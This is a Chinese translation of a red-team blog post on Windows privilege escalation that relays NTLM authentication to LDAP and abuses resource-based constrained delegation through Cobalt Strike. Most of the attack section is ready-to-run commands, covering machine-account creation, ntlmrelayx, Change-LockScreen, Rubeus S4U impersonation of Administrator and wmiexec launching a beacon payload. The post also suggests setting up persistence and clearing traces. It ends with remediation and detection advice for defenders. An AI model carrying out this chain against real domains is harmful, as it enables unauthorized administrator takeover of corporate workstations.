**概述**  
第一部分中，我们介绍了一种我们在红队任务中利用的 Windows 本地权限提升方法，这种方法在安装了许多应用程序的多用户系统（如
Citrix）上特别普遍。在第二部分中，我们介绍另一种常见的本地权限提升漏洞，我们在 Windows 域环境中利用它来提升员工工作站的权限。  
虽然之前已经有几篇文章记录了如何利用这个问题进行攻击[1][3][5]，但是操作员，特别是较新的操作员，通常会因为在 Cobalt Strike
的beacon和难捉摸的 Kerberos 协议相关细节操作化方面存在复杂性而难以利用此问题。例如，许多现有的指南都假定攻击者可以访问另一个内部 Linux
系统以执行 LDAP 中继攻击，这导致一些操作员认为纯粹通过 Cobalt Strike 利用该问题是不可能的。
在本文中，我们的目标是描述漏洞背后的基本原理以及 Cobalt Strike 中网络枢纽和代理的许多复杂细节。

**本地主机 NTLM 中继技术概述**  
在这种情况下，我们利用了一个事实：从非特权用户上下文中，我们可以诱导作为 NT AUTHORITY\SYSTEM 运行的本地服务使用主机的计算机帐户密码进行
NTLM 身份验证，通过 HTTP 向运行在本地主机上的攻击者服务进行身份验证[1]。然后，攻击者可以将该身份验证尝试中继到 LDAP
服务，以配置基于资源的受限委派（RBCD）[6]，以允许由攻击者控制的用户或计算机帐户模拟任何用户对受害计算机进行攻击。Elad Shamir
在他的文章“Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack
Active Directory” [1]中详细讨论了该攻击背后的理论基础。 在他的文章“Gone to the Dogs” [5]中，Elad
Shamir概述了一种获得“Computer Account NetNTLM authentication over
HTTP”原语的非特权用户方法，方法是利用了自定义 Windows 锁屏的能力。随后，Simone Salucci 和 Daniel Jiménez 发布了
Change-LockScreen [4] 工具，该工具允许通过 Cobalt Strike 的beacon触发原语，而无需通过 RDP
或控制台访问手动交互。 要成功利用漏洞，需要满足以下先决条件：  
1.运行 Windows Server 2012 或更新操作系统的域控制器  
2.攻击者必须能够访问已设置服务主体名称的用户或计算机帐户对象，或者能够将新计算机添加到域中  
3.域控制器必须未配置强制 LDAP 签名和 LDAP 信道绑定（默认设置）  
4.受害计算机必须安装并运行“Web 客户端”服务（默认情况下安装在 Windows 10 上）  
5.用户必须被允许自定义 Windows 锁屏（默认权限）  
在接下来的几节中，我们描述操作员如何完全通过 Cobalt Strike 利用此问题。在我们的示例场景中，攻击者成功钓鱼了用户 JSMITH，并因此在
CONTOSO.LOCAL 域内的 DESKTOP-KOERA35 上执行代码。在此示例中，CONTOSO.LOCAL 域在 Windows Server
2019 的域控制器上以“Windows Server 2008”的域功能级别运行。

**通过 Cobalt Strike Beacon 进行攻击**  
首先，操作员必须在 Cobalt Strike 中启用和配置 SOCKS 代理，并在 Cobalt Strike
团队服务器上安装必要的依赖项。特别是，利用该问题需要在主机上安装 proxychains、Python 3 和 Impacket。然后，操作员启动
SOCKS 代理，在本例中，我们利用端口 8889，并在 proxychains.conf 文件中配置 proxychains 来利用此端口。

![](./img/6690622424338998418.png)

配置 SOCKS 代理功能后，我们必须获得具有服务主体名称或计算机帐户的用户的访问权限，因为这对于执行 S4U Self和 S4U
Proxy操作是必需的。我们可以利用“SharpView” [8] 实用程序使用 execute-assembly 从域对象中读取“ms-ds-machineaccountquota”属性。执行此操作的示例命令如下。

    
    
    execute-assembly /home/engineer/hgfs/tools/SharpTeam/SharpView.exe Get-DomainObject -Domain CONTOSO.LOCAL

以下是此命令的预期输出。在这种情况下，默认设置已配置，允许任何用户加入最多十台计算机到域中。

![](./img/3587800612690465165.png)

然后，我们通过运行“sc query webclient”命令来查询 WebClient 服务的状态。Windows 10 默认包括 WebClient
服务。执行命令后的示例输出如下所示。

![](./img/308336893797977347.png)

然后，我们可以利用 Ruben Boonen 的 StandIn
工具创建一个新的计算机帐户，在进行中继攻击时使用以下命令。在这种情况下，我们创建一个名为“DESKTOP-JSMITH”的新计算机帐户。

    
    
    execute-assembly /home/engineer/hgfs/tools/SharpTeam/StandIn.exe --computer DESKTOP-JSMITH --make

运行此命令后产生的输出如下图所示：

![](./img/4229670042655064721.png)

假设“ms-ds-machineaccountquota”设置不允许用户创建新计算机帐户。在这种情况下，攻击者可能尝试通过 Kerberoasting
来危及具有服务主体名称 (SPN) 的用户。或者，攻击者可以尝试在其当前用户帐户上设置 SPN。默认情况下，Active Directory
不允许这样做；但是，在某些情况下，管理员可以修改默认的概要权限以允许这样做。 然后，我们可以使用以下命令利用 LDAP 中继攻击。在这种情况下，我们将
HTTP 监听器配置为监听端口 8080。然后我们指定“--serve-image”标志以及要设置为锁屏背景的图像路径。重要的是要注意，在完成攻击后，如果用户之前没有配置锁屏图像，则此图像将显示在用户的锁屏上。如果用户已经配置了自定义锁屏图像，则
Change-LockScreen 工具将将此图像恢复为其原始值。默认的 Windows 锁屏个性化图像位于
C:\Windows\Web\Screen\。这些图像可能被利用作为新的锁屏图像而不会引起用户注意。我们还指定“--escalate-user”标志，指示
ntlmrelayx 允许“DESKTOP-JSMITH”用户对任何中继计算机帐户执行 RBCD。我们针对位于 192.168.184.135 的
Windows Server 2019 域控制器进行目标定位。在代理连接速度较慢的环境中可以包含“--no-validate-privs”选项。

    
    
    sudo proxychains python3 examples/ntlmrelayx.py -t ldap://192.168.184.135 --http-port 8080 --    delegate-access --serve-image wallpaper.jpg --escalate-user 'DESKTOP-JSMITH$' --no-dump --    no-da --no-acl

以下是预期输出：

![](./img/1841534951148307550.png)

接下来，我们使用rportfwd命令“rportfwd 80 127.0.0.1 8080”在受害者主机上打开端口80，并指示Cobalt
Strike将所有流量转发到Cobalt Strike团队服务器端口为8080上的本地主机。 然后，我们利用Change-LockScreen
[4]实用程序通过运行以下命令触发计算机帐户身份验证：

    
    
    execute-assembly /home/engineer/hgfs/tools/Change-Lockscreen.exe -FullPath
    \\localhost\pictures\wallpaper.jpg

rportfwd和Change-LockScreen命令的预期输出如下：

![](./img/3718370868591699422.png)

当接收到身份验证时，我们可以预期看到下面显示的输出。在本例中，当前用户帐户JSMITH将首先执行身份验证以获取图像。然后将使用计算机帐户密码通过HTTP执行后续身份验证，如下图所示。

![](./img/7877157235173397261.png)

接下来，我们使用Rubeus实用程序的哈希子命令从DESKTOP-JSMITH计算机帐户密码生成AES256密钥。生成的密钥将在后续步骤中用于执行S4U
Self和S4U Proxy操作。以下命令可与Rubeus一起使用以从生成的计算机帐户名称和密码生成AES256密钥：

    
    
    /
    execute-assembly /home/engineer/hgfs/tools/Rubeus.exe hash /password:3UZBahMCcuTMsDF
    /user:DESKTOP-JSMITH$ /domain:CONTOSO.LOCAL

这个命令的预期输出如下：

![](./img/73235260720669787.png)

然后，我们利用返回的aes256_cts_hmac_sha1密钥，使用攻击者控制的“DESKTOP-JSMITH$”计算机帐户执行S4U模拟，以检索“Administrator”用户的TGS票据，用于“host/DESKTOP-KOERA35.CONTOSO.LOCAL” SPN。在这种情况下，访问配置有“host”服务的TGS票据允许我们对Windows Management
Instrumentation（WMI）服务进行身份验证并以模拟的用户身份执行任意代码。需要注意的是，使用RBCD，我们可以模拟未配置为“Account
is sensitive and cannot be delegated”的任何用户[9]。这包括Active Directory中“Protected
Users” 组中的任何用户[9]。以下命令可与Rubeus一起使用以获取“Administrator”用户的“host/DESKTOP-KOERA35.CONTOSO.LOCAL”服务的TGS票据：

    
    
    execute-assembly /home/engineer/hgfs/tools/Rubeus.exe s4u /user:DESKTOP-JSMITH$
    /aes256:7FA7441BD35ACAB0EDA6E101720CF090E41A88BFC972EB6B7839BF8FC3D564
    99 /impersonateuser:Administrator /msdsspn:host/DESKTOP-KOERA35.CONTOSO.LOCAL
    /nowrap

命令的预期输出如下所示，但有一个关键的区别。在这种情况下，我们省略了/nowrap标志，以使命令输出在示例屏幕截图中更易读。

![](./img/4447743334755335441.png)

操作员必须将Rubeus生成的票据格式转换为ccache格式，以与Impacket兼容。该票据是一个以base64编码的字符串，表示kirbi格式的编码TGS票据。幸运的是，Impacket通过利用ticketConverter.py实用程序本地支持此操作。下面给出的命令序列可以由操作员利用，将生成的base64编码kirbi文件转换为ccache格式。

    
    
    $ vim administrator.kirbi.base64
    $ cat administrator.kirbi.base64 | base64 --decode > administrator.kirbi
    $ python3 examples/ticketConverter.py administrator.kirbi administrator.ccache

执行这些命令后，操作员可以预期看到类似于以下图示的输出：

![](./img/2500886284456819980.png)

接下来，我们必须修改proxychains
中的proxyresolv配置以支持内部域名的解析。这种更改对于使用Kerberos很重要。在Ubuntu上，proxyresolv脚本的默认位置是“/usr/lib/proxychains3/proxyresolv”。与默认配置相比，主要修改如下：

  * 我们修改“DNS_SERVER=”行以指向CONTOSO.LOCAL域控制器以进行名称解析 
  * 我们修改dig命令以使用“grep -v‘<<>>’”删除默认模板中被awk语句忽略的多余字符  
在测试过程中，我们观察到用于过滤dig输出的awk语句未正确过滤解析内部域名（例如CONTOSO.LOCAL）时由dig打印的“<<>>”字符串。虽然原因不明，但修改命令以从输出中排除此字符串解决了该问题。

    
        #!/bin/sh
    # This script is called by proxychains to resolve DNS names
    # DNS server used to resolve names
    DNS_SERVER=192.168.184.135
    if [ $# = 0 ] ; then
    echo " usage:"
    echo " proxyresolv &lthostname&gt "
    exit
    fi
    export LD_PRELOAD=libproxychains.so.3
    dig $1 @$DNS_SERVER +tcp | awk '/A.+[0-9]+\.[0-9]+\.[0-9]/{print $5;}' | grep -v '<<>>'
    

在将票据转换为适当的格式并配置proxychains之后，我们现在可以利用获得的TGS票据来冒充“管理员”域管理员帐户到主机上，这里需要使用Impacket。不幸的是，我们必须将Impacket代理到DESKTOP-KOERA35主机上，以使用TGS票据触发网络登录，因为从主机到自身执行票据传递攻击似乎不会生成利用与用户登录会话相关联的TGS票据的网络登录事件。这种观察到的现象在后续的“常见的Kerberos相关错误.”一节中讨论。

要使用Impacket利用获得的TGS票据，我们首先将KRB5CCNAME环境变量设置为指向磁盘上票据的路径。然后，我们使用以下命令和proxychains来执行与Impacket的网络身份验证，并在“C:\ProgramData\beacon.exe”中执行beacon有效载荷。
-k标志用于指示Impacket将执行Kerberos身份验证。

    
    
    $ export KRB5CCNAME=administrator.ccache
    $ proxychains python3 examples/wmiexec.py -k -no-pass
    contoso.local/Administrator@DESKTOP-KOERA35.CONTOSO.LOCAL
    'C:\ProgramData\beacon.exe'

下图显示了身份验证和随后执行beacon有效载荷时的预期输出。

![](./img/8287903696949125981.png)

在这种情况下，操作员收到了回调，表明以高完整性模式的beacon被成功执行，其作为Administrator
用户运行。检查生成的beacon权限，我们可以看到我们现在具有主机上的管理员权限，如下所示。

![](./img/7023955870358842799.png)

现在，我们可以使用“socks stop”和“rportfwd stop
80”命令关闭SOCKS代理和远程端口转发，如下所示，并完成利用。攻击者可能希望以管理员用户建立持久性，并删除相关的RBCD配置，以避免在环境中留下配置更改的残留文件及内容。

![](./img/1897779564766596607.png)

**常见的Kerberos相关错误**  
操作员试图执行“Pass the
Ticket”或其他基于Kerberos的攻击时经常犯的一个错误是指定IP地址或缩写主机名而不是服务主体名称中指定的值（通常是完整的非缩写主机名）。此错误如下图所示。操作员指定了IP地址（192.168.184.144），而不是生成的TGS票据（DESKTOP-KOERA35.CONTOSO.LOCAL）关联的服务主体名称中指定的完整主机名。

![](./img/7135184379636910906.png)

我们观察到的另一个常见错误是，操作员可能尝试使用Rubeus从执行S4U时检索到的TGS票据将新beacon生成为当前登录会话中的TGS票据。虽然当针对其他主机时此技术是有效的，但似乎情况是这样：从同一主机使用WMI执行beacon时不会执行“完整网络登录”。而是利用与进程关联的安全令牌。下图显示了这种情况。即使“Administrator”用户的TGS令牌与其登录会话相关，次要beacon也作为“JSMITH”用户生成。为避免遇到此问题，我们必须使用SOCKS将Impacket代理到主机以执行完整的网络登录。

![](./img/1349773579078416111.png)

**整改指南**  
禁用msDS-AllowedToActOnBehalfOfOtherIdentity字段的写访问似乎是一个有效的临时缓解措施，可阻止利用[1]。但是，此控件不能通用地修复LDAP中继攻击，仅适用于计算机帐户接管案例。强制执行LDAP签名和LDAP通道绑定是通用修复LDAP中继攻击风险的最有效长期措施[7]。  
还有充分的机会实施高保真度检测，重点检测基于资源的约束委派或LDAP中继攻击。在某些环境中，实施其他技术控件可能不如实施附加检测措施可取。例如，组织可能利用许多不支持LDAP签名或LDAP通道绑定的第三方应用程序，使得修复变得困难。  
防御者可以考虑实施一个新的系统审核控制列表（SACL），旨在检测对“msDS-AllowedToActOnBehalfOfOtherIdentity”字段的写入。在大多数环境中，基于资源的约束委派的合法用例非常罕见。此外，包括RBCD在内的Kerberos委派通常仅由服务器使用，因此防御者应仔细考虑员工工作站计算机帐户对“msDS-AllowedToActOnBehalfOfOtherIdentity”属性的任何修改。  
截至2020年3月，Microsoft还支持启用可选审核设置以审核LDAP签名和LDAP通道绑定[10]。事件ID 2889和事件ID
3039可用于标识未使用通道绑定或LDAP签名进行LDAP身份验证的系统[10]。防御者可以潜在地建立一个已知主机列表，运行不支持这些措施的第三方应用程序。与此已知基线的任何偏差都可能被调查以确定潜在的LDAP中继攻击。

**结论**  
本文介绍了当与适当的身份验证原语相结合时，基于资源的约束委派（RBCD）允许进行本地特权提升（以及潜在的远程代码执行）的方法。我们还介绍了操作员如何使用Cobalt
Strike执行网络枢纽操作的标准方法。对于从内部渗透测试转向红队操作的工程师来说，这个领域经常很棘手，因为使用这些工具通过Cobalt
Strike而不是由客户提供的基于Linux的跳板主机时存在复杂性。  
本文没有提出任何新颖或未发表的技术。相反，我们主要关注攻击者如何通过Cobalt Strike完全操作化此技术，并解决常常是红队参与单独操作限制的问题。

引用  
[1]<https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html>  
[2]<https://www.praetorian.com/blog/obtaining-laps-passwords-through-ldap-relaying-attacks>  
[3]<https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/>  
[4]<https://github.com/nccgroup/Change-Lockscreen>  
[5]<https://eladshamir.com/2019/08/08/Lock-Screen-LPE.html>  
[6]<https://petri.com/understanding-kerberos-delegation-in-windows-server-active-directory>  
[7]<https://support.microsoft.com/en-us/topic/2020-ldap-channel-binding-and-ldap-signing-requirements-for-windows-ef185fb8-00f7-167d-744c-f299a66fc00a>  
[8]<https://github.com/tevora-threat/SharpView>  
[9]<https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/>  
[10]<https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/ldap-channel-binding-and-ldap-signing-requirements-march-2020/ba-p/921536>  
From:<https://www.praetorian.com/blog/red-team-privilege-escalation-rbcd-based-privilege-escalation-part-2/>

